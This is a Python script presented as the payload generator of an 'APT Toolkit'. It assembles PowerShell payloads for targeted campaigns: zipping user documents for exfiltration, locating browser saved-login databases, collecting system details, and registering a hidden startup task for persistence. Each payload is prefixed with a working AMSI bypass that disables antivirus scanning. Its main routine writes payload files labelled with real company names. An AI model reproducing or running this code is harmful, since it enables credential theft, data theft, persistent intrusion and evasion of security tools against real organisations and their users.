#!/usr/bin/env python3
"""
Campaign-Specific Payload Generator for APT Toolkit
"""

import os
import json
import random
import hashlib
from datetime import datetime

class CampaignPayloadGenerator:
    """Generator for campaign-specific payloads"""
    
    def __init__(self):
        self.campaign_types = {
            "financial_institution": {
                "payload_focus": ["data_exfiltration", "credential_theft"],
                "evasion_profile": "stealth"
            },
            "government_agency": {
                "payload_focus": ["intelligence_gathering", "persistence"],
                "evasion_profile": "aggressive"
            },
            "technology_company": {
                "payload_focus": ["source_code_theft", "data_exfiltration"],
                "evasion_profile": "stealth"
            }
        }
    
    def generate_payload(self, organization: str, campaign_type: str) -> dict:
        """Generate campaign payload"""
        campaign_config = self.campaign_types.get(campaign_type, self.campaign_types["financial_institution"])
        payload_focus = random.choice(campaign_config["payload_focus"])
        
        base_payload = self._get_base_payload(payload_focus)
        final_payload = self._add_evasion(base_payload, campaign_config["evasion_profile"])
        
        return {
            "payload": final_payload,
            "metadata": {
                "organization": organization,
                "campaign_type": campaign_type,
                "payload_focus": payload_focus,
                "generated_at": datetime.now().isoformat()
            }
        }
    
    def _get_base_payload(self, payload_focus: str) -> str:
        """Get base payload template"""
        templates = {
            "data_exfiltration": """
# Data Exfiltration
$files = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10
if ($files) {
    $archive = "$env:TEMP\\data.zip"
    Compress-Archive -Path $files.FullName -DestinationPath $archive -Force
}
""",
            "credential_theft": """
# Credential Theft
$browsers = @("Chrome", "Firefox", "Edge")
foreach ($browser in $browsers) {
    $loginData = Get-ChildItem "$env:USERPROFILE\\AppData\\Local\\$browser" -Recurse -Include "Login Data" -ErrorAction SilentlyContinue
    if ($loginData) { break }
}
""",
            "intelligence_gathering": """
# Intelligence Gathering
$systemInfo = @{
    Hostname = $env:COMPUTERNAME
    Username = $env:USERNAME
    Domain = $env:USERDOMAIN
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
}
$systemInfo | ConvertTo-Json | Out-File "$env:TEMP\\system_info.json"
""",
            "persistence": """
# Persistence
$taskName = "SystemUpdate"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force
"""
        }
        return templates.get(payload_focus, templates["data_exfiltration"])
    
    def _add_evasion(self, payload: str, evasion_profile: str) -> str:
        """Add evasion techniques"""
        evasion_code = ""
        
        if evasion_profile in ["stealth", "aggressive"]:
            evasion_code = """
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

"""
        
        return evasion_code + payload
    
    def save_payload(self, payload_data: dict, output_dir: str) -> str:
        """Save payload to file"""
        os.makedirs(output_dir, exist_ok=True)
        
        org_slug = payload_data["metadata"]["organization"].lower().replace(' ', '_')
        campaign_slug = payload_data["metadata"]["campaign_type"].lower().replace(' ', '_')
        
        filename = f"{org_slug}_{campaign_slug}_{int(datetime.now().timestamp())}.ps1"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w') as f:
            f.write(payload_data["payload"])
        
        return filepath

def main():
    generator = CampaignPayloadGenerator()
    
    # Generate sample payloads
    organizations = ["Google", "Microsoft", "Apple"]
    campaign_types = ["financial_institution", "government_agency", "technology_company"]
    
    for org in organizations:
        for campaign in campaign_types:
            print(f"Generating payload for {org} - {campaign}")
            payload_data = generator.generate_payload(org, campaign)
            
            # Save payload
            org_slug = org.lower().replace(' ', '_')
            campaign_slug = campaign.lower().replace(' ', '_')
            output_dir = f"payloads/organizations/{org_slug}"
            os.makedirs(output_dir, exist_ok=True)
            
            filename = f"{org_slug}_{campaign_slug}_{int(datetime.now().timestamp())}.ps1"
            filepath = os.path.join(output_dir, filename)
            
            with open(filepath, 'w') as f:
                f.write(payload_data["payload"])
            
            print(f"  Saved to: {filepath}")

if __name__ == "__main__":
    main()